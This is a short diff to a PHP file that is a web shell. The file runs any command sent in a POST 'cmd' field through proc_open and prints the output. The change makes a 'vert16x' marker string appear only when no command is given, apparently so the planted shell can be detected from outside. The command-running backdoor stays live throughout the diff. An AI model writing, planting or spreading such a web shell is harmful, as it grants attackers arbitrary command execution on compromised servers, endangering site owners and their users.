@@ -1,5 +1,5 @@
 <?php 
-	echo "vert16x\n";
+	
 	if(isset($_POST["cmd"])){
     	$cmd = ($_POST['cmd']);
 	
@@ -11,5 +11,7 @@
 	        {echo stream_get_contents($pipes[1]); 
 			fclose($pipes[1]);proc_close($process);
 		}}exec_command($cmd); exit; 
+	}else{
+		echo "vert16x";
 	}
 ?>
